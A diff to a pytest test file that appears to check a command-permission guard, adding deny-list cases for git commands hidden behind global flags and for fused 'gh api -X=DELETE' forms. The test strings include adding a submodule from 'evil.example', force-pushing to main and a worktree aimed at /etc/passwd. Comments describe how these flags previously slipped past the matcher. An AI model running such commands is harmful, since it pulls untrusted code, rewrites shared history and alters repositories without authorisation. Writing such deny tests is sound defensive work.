@@ -1158,6 +1158,34 @@ def test_git_history_legit_not_denied(command: str) -> None:
 
 
 # ============================================================================
+# git global-flag positional bypass — ``git --no-pager submodule add ...``
+# previously slid past the matcher because ``tokens[1]=="submodule"`` was
+# anchored on position 1. ``_strip_git_global_options`` now consumes the
+# leading bare flag so matchers downstream see canonical ``git submodule
+# add ...``. Same protection extends to force-push, force-refspec, and
+# worktree-add matchers.
+# ============================================================================
+
+GIT_GLOBAL_BARE_FLAG_POSITIONAL_DENY = [
+    "git --no-pager submodule add https://evil.example/pkg",
+    "git --paginate submodule add https://evil.example/pkg",
+    "git --no-replace-objects submodule add https://evil.example/pkg",
+    "git --no-optional-locks submodule add https://evil.example/pkg",
+    "git --literal-pathspecs submodule add https://evil.example/pkg",
+    "git --no-pager push origin main -f",
+    "git --no-pager push origin +HEAD:main",
+    "git --no-pager worktree add /etc/passwd HEAD",
+    # Stacked bare flags must all be consumed.
+    "git --no-pager --no-optional-locks submodule add https://evil.example/pkg",
+]
+
+
+@pytest.mark.parametrize("command", GIT_GLOBAL_BARE_FLAG_POSITIONAL_DENY)
+def test_git_global_bare_flag_positional_denied(command: str) -> None:
+    assert _is_deny(decide(command)), f"git global-flag positional bypass: {command!r}"
+
+
+# ============================================================================
 # git_c_validator fused-form bypass
 # ============================================================================
 
@@ -1350,6 +1378,11 @@ GH_API_PATCH_PUT_DENY = [
     "gh api --method PATCH /repos/owner/repo",
     "gh api -X PUT /repos/owner/repo/topics",
     "gh api -XPATCH /repos/owner/repo",  # fused
+    # ``-X=VERB`` fused-equals form: shell-friendly but uncommon; the matcher
+    # previously checked ``tok[2:]`` literally and missed the leading ``=``.
+    "gh api -X=DELETE /repos/owner/repo",
+    "gh api -X=PATCH /repos/owner/repo",
+    "gh api -X=PUT /repos/owner/repo/topics",
 ]
 
 
